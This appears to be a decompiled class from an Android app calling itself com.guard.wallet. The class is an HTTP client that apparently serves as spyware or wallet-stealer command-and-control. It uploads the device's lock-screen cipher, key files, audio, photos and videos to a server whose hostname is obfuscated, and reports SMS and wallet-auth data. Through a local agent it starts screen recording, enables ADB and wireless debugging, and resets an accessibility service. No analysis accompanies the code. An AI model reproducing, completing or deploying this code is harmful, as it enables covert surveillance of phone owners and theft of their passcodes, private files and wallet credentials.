package com.guard.wallet.http;

import a1.AbstractC0026q;
import android.util.Log;
import com.google.json.JsonObject;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.req.ApiRequest;
import com.guard.wallet.req.DeviceUpdateVO;
import com.guard.wallet.req.MessageBodyVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.QueryAgentFileVO;
import com.guard.wallet.req.ReqAppLocateValueVO;
import com.guard.wallet.req.ReqDefaultBodyVO;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ReqListenWindowVO;
import com.guard.wallet.req.ReqMessageVO;
import com.guard.wallet.req.ReqNoticeAliveVO;
import com.guard.wallet.req.ReqResetAccessibilityService;
import com.guard.wallet.req.ReqSmsRecognizePlugVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.UploadFileVO;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.CacheTaskResponseVO;
import com.guard.wallet.resp.PushResponseVO;
import com.guard.wallet.resp.RespCipherStateVO;
import com.guard.wallet.utils.AbstractC0248d;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.FutureTask;
import l0.C0383m;
import p0.C0879u;
import p0.InterfaceC0863e;
import p0.f0;
import p007j.C0350e;

/* renamed from: com.guard.wallet.http.l */
/* loaded from: classes.dex */
public abstract class AbstractC0207l {

    /* renamed from: a */
    public static final String f252a;

    /* renamed from: b */
    public static final ConcurrentLinkedQueue f253b;

    /* renamed from: c */
    public static final LinkedHashMap f254c;

    static {
        ConcurrentLinkedQueue concurrentLinkedQueue = new ConcurrentLinkedQueue();
        f253b = concurrentLinkedQueue;
        f254c = new LinkedHashMap();
        String concat = "https://".concat(AbstractC0248d.m610h());
        f252a = concat;
        concurrentLinkedQueue.offer(concat + "/api/message/post.json");
        concurrentLinkedQueue.offer(concat + "/api/cipher/postLockCipher.json");
        concurrentLinkedQueue.offer(concat + "/api/cipher/postOtherCipher.json");
        concurrentLinkedQueue.offer(concat + "/api/pairKeyFile/batch.json");
        concurrentLinkedQueue.offer(concat + "/api/audioFile/batch.json");
        concurrentLinkedQueue.offer(concat + "/api/photoFile/batch.json");
        concurrentLinkedQueue.offer(concat + "/api/videoFile/batch.json");
    }

    /* renamed from: A */
    public static void m413A(LinkedList linkedList) {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l) || linkedList == null || linkedList.isEmpty()) {
            return;
        }
        e0 e0Var = new e0();
        new C0204i().m410j(new UploadFileVO(m708l, "100013"), "/api/audioFile/batch.json", linkedList, e0Var);
    }

    /* renamed from: B */
    public static void m414B(ReqUnlockDeviceVO reqUnlockDeviceVO) {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return;
        }
        reqUnlockDeviceVO.setDeviceId(m708l);
        new C0204i(f252a).m408h(reqUnlockDeviceVO, "/api/cipher/postLockCipher.json", new c0());
    }

    /* renamed from: C */
    public static void m415C(RespCipherStateVO respCipherStateVO) {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return;
        }
        respCipherStateVO.setDeviceId(m708l);
        new C0204i(f252a).m408h(respCipherStateVO, "/api/cipher/postOtherCipher.json", new c0());
    }

    /* renamed from: D */
    public static void m416D(LinkedList linkedList) {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l) || linkedList.isEmpty()) {
            return;
        }
        e0 e0Var = new e0();
        new C0204i().m410j(new UploadFileVO(m708l, "100014"), "/api/photoFile/batch.json", linkedList, e0Var);
    }

    /* renamed from: E */
    public static void m417E(LinkedList linkedList) {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l) || linkedList.isEmpty()) {
            return;
        }
        e0 e0Var = new e0();
        new C0204i().m410j(new UploadFileVO(m708l, "100015"), "/api/videoFile/batch.json", linkedList, e0Var);
    }

    /* renamed from: a */
    public static void m418a() {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return;
        }
        new C0204i().m405d(new ReqAppLocateValueVO(m708l, AbstractC0252h.m709m()), "/api/locateValue/entryAppMap.json", new C0196a());
    }

    /* renamed from: b */
    public static JsonObject m419b(ReqDefaultBodyVO reqDefaultBodyVO, String str, String str2) {
        if (!AbstractC0251g.l0()) {
            return C0204i.m401g(null);
        }
        try {
            FutureTask futureTask = new FutureTask(new CallableC0206k(reqDefaultBodyVO, str, str2, 0));
            new Thread(futureTask).start();
            return (JsonObject) futureTask.get();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpUtils", e2);
            return C0204i.m401g(null);
        }
    }

    /* renamed from: c */
    public static void m420c() {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return;
        }
        new C0204i().m405d(new ReqDefaultBodyVO(m708l), "/api/cipher/lockCiphers", new C0350e(2));
    }

    /* renamed from: d */
    public static boolean m421d() {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l) || AbstractC0026q.m151B("ACCESSIBILITY_CONTAINER")) {
            return false;
        }
        new C0204i().m405d(new ReqListenWindowVO(m708l, AbstractC0252h.m709m(), "ACCESSIBILITY_CONTAINER"), "/api/listen/windows.json", new C0208m());
        return true;
    }

    /* renamed from: e */
    public static void m422e() {
        if (AbstractC0026q.m151B("http://127.0.0.1:7912")) {
            return;
        }
        new C0204i("http://127.0.0.1:7912").m405d(null, "/closeDevelopment", new C0197b());
    }

    /* renamed from: f */
    public static void m423f(String str) {
        if (AbstractC0026q.m151B(str)) {
            return;
        }
        new C0204i(str).m405d(null, "/closeWifiDebug", new C0198c());
    }

    /* renamed from: g */
    public static void m424g(String str) {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(str)) {
            str = "http://127.0.0.1:7911";
        }
        if (!AbstractC0026q.m151B(m708l)) {
            m420c();
        } else {
            new C0204i(str).m405d(null, "/deviceId", new C0200e());
        }
    }

    /* renamed from: h */
    public static void m425h(ReqListenHelper reqListenHelper) {
        if (AbstractC0026q.m154E(7912)) {
            return;
        }
        new C0204i("http://127.0.0.1:7912").m408h(reqListenHelper, "/finishListenHelper", new C0350e(1));
        Log.d("HttpUtils", "已发送 localFinishListenHelper");
    }

    /* renamed from: i */
    public static boolean m426i(ReqListenHelper reqListenHelper) {
        if (AbstractC0026q.m154E(7912)) {
            return false;
        }
        new C0204i("http://127.0.0.1:7912").m408h(reqListenHelper, "/listenHelper", new C0350e(1));
        Log.d("HttpUtils", "已发送 localListenHelper");
        return true;
    }

    /* renamed from: j */
    public static void m427j() {
        if (AbstractC0251g.m653Z() != null) {
            C0350e c0350e = new C0350e(1);
            new C0204i("http://127.0.0.1:7912").m405d(new ReqNoticeAliveVO(AbstractC0251g.m653Z().getPackageName()), "/noticeAlive", c0350e);
        }
    }

    /* renamed from: k */
    public static void m428k(String str) {
        if (AbstractC0026q.m151B(str)) {
            return;
        }
        new C0204i(str).m405d(null, "/openADBDebug", new C0211p());
    }

    /* renamed from: l */
    public static void m429l(String str) {
        if (AbstractC0026q.m151B(str)) {
            return;
        }
        new C0204i(str).m405d(null, "/openDevelopment", new C0212q());
    }

    /* renamed from: m */
    public static void m430m(String str) {
        if (AbstractC0026q.m151B(str)) {
            return;
        }
        new C0204i(str).m405d(null, "/openWifiDebug", new C0213r());
    }

    /* renamed from: n */
    public static boolean m431n() {
        if (!AbstractC0026q.m154E(7912)) {
            C0204i c0204i = new C0204i("http://127.0.0.1:7912");
            String m406e = c0204i.m406e(null, "/screenrecord/start");
            C0383m c0383m = new C0383m();
            c0383m.m956d(m406e);
            c0383m.m954b("GET", null);
            JsonObject m404b = c0204i.m404b(c0383m.m953a());
            if (m404b != null) {
                ApiResult apiResult = (ApiResult) AbstractC0252h.m699c(m404b.getAsString(), new TypeToken<ApiResult<Boolean>>() { // from class: com.guard.wallet.http.HttpUtils$1
                });
                if (apiResult != null && apiResult.getSuccess().booleanValue() && ((Boolean) apiResult.getData()).booleanValue()) {
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: o */
    public static boolean m432o() {
        if (!AbstractC0026q.m154E(7912)) {
            C0204i c0204i = new C0204i("http://127.0.0.1:7912");
            String m406e = c0204i.m406e(null, "/screenrecord/stop");
            C0383m c0383m = new C0383m();
            c0383m.m956d(m406e);
            c0383m.m954b("GET", null);
            JsonObject m404b = c0204i.m404b(c0383m.m953a());
            if (m404b != null) {
                ApiResult apiResult = (ApiResult) AbstractC0252h.m699c(m404b.getAsString(), new TypeToken<ApiResult<Boolean>>() { // from class: com.guard.wallet.http.HttpUtils$2
                });
                if (apiResult != null && apiResult.getSuccess().booleanValue() && ((Boolean) apiResult.getData()).booleanValue()) {
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: p */
    public static void m433p(ADBConfig aDBConfig) {
        new C0204i("http://127.0.0.1:7911").m408h(aDBConfig, "/syncADBConfig", new C0350e(1));
    }

    /* renamed from: q */
    public static JsonObject m434q(ApiRequest apiRequest, String str) {
        String str2 = "/api/message/post.json";
        if (!AbstractC0251g.l0()) {
            return C0204i.m401g(null);
        }
        try {
            FutureTask futureTask = new FutureTask(new CallableC0206k(apiRequest, str, str2, 1));
            new Thread(futureTask).start();
            return (JsonObject) futureTask.get();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpUtils", e2);
            return C0204i.m401g(null);
        }
    }

    /* renamed from: r */
    public static void m435r(CacheTaskResponseVO cacheTaskResponseVO) {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return;
        }
        cacheTaskResponseVO.setDeviceId(m708l);
        cacheTaskResponseVO.setContainerCode("ACCESSIBILITY_CONTAINER");
        new C0204i().m408h(cacheTaskResponseVO, "/api/containerApi/postCacheTaskResponse.json", new C0350e(1));
    }

    /* renamed from: s */
    public static void m436s(PushResponseVO pushResponseVO) {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return;
        }
        pushResponseVO.setDeviceId(m708l);
        new C0204i().m408h(pushResponseVO, "/api/deviceInstallLog/post.json", new C0350e(1));
    }

    /* renamed from: t */
    public static void m437t(String str) {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(str) || AbstractC0026q.m151B(m708l)) {
            return;
        }
        MessageRecordVO messageRecordVO = new MessageRecordVO();
        messageRecordVO.setDeviceId(m708l);
        messageRecordVO.setIntentCode(str);
        messageRecordVO.setExtraBody(new MessageBodyVO());
        ReqMessageVO reqMessageVO = new ReqMessageVO();
        reqMessageVO.setDeviceId(messageRecordVO.getDeviceId());
        reqMessageVO.setIntentCode(messageRecordVO.getIntentCode());
        if (messageRecordVO.getExtraBody() != null) {
            reqMessageVO.setExtraBody(AbstractC0252h.m693N(messageRecordVO.getExtraBody()));
        }
        LinkedList linkedList = new LinkedList();
        linkedList.add(reqMessageVO);
        ApiRequest apiRequest = new ApiRequest();
        apiRequest.setData(linkedList);
        new C0204i().m408h(apiRequest, "/api/message/post.json", new C0350e(1));
    }

    /* renamed from: u */
    public static boolean m438u() {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return false;
        }
        QueryAgentFileVO queryAgentFileVO = new QueryAgentFileVO();
        queryAgentFileVO.setDeviceId(m708l);
        new C0204i().m405d(queryAgentFileVO, "/api/agent/query.json", new C0216u());
        return true;
    }

    /* renamed from: v */
    public static void m439v() {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return;
        }
        new C0204i().m405d(new ReqDefaultBodyVO(m708l), "/api/walletAuth/strategy/noCompletes", new C0210o());
    }

    /* renamed from: w */
    public static void m440w() {
        C0350e c0350e = new C0350e(1);
        new C0204i("http://127.0.0.1:7912").m405d(new ReqResetAccessibilityService("com.guard.wallet/.service.MyAccessibilityService"), "/resetAccessibilityService", c0350e);
        Log.d("HttpUtils", "已发送 resetAccessibilityService");
    }

    /* renamed from: x */
    public static void m441x(p0.e0 e0Var, InterfaceC0863e interfaceC0863e) {
        if (e0Var == null) {
            return;
        }
        f0 f0Var = e0Var.f1773c;
        if (AbstractC0026q.m151B(f0Var.f1777a.f1914h)) {
            return;
        }
        C0879u c0879u = f0Var.f1777a;
        if (c0879u.f1914h.contains(f252a) && !AbstractC0026q.m154E(7912)) {
            C0204i c0204i = new C0204i("http://127.0.0.1:7912");
            String concat = AbstractC0026q.m151B(c0879u.m1299n().getPath()) ? "/router" : "/router".concat(c0879u.m1299n().getPath());
            Log.d("FetchClient", "路由转发URI");
            String m407f = c0204i.m407f(concat);
            if (interfaceC0863e == null) {
                interfaceC0863e = new C0350e(1);
            }
            C0383m c0383m = new C0383m(f0Var);
            c0383m.m956d(m407f);
            p0.e0.m1246d(c0204i.m403a(), c0383m.m953a(), false).m1247a(interfaceC0863e);
        }
    }

    /* renamed from: y */
    public static boolean m442y() {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return false;
        }
        new C0204i().m405d(new ReqSmsRecognizePlugVO(m708l), "/api/smsRecognize/plug.json", new C0221z());
        return true;
    }

    /* renamed from: z */
    public static void m443z() {
        String m708l = AbstractC0252h.m708l("deviceId");
        if (AbstractC0026q.m151B(m708l)) {
            return;
        }
        DeviceUpdateVO of = DeviceUpdateVO.of();
        of.setDeviceId(m708l);
        new C0204i().m408h(of, "/api/device/updateDeviceInfo.json", new C0202g());
    }
}
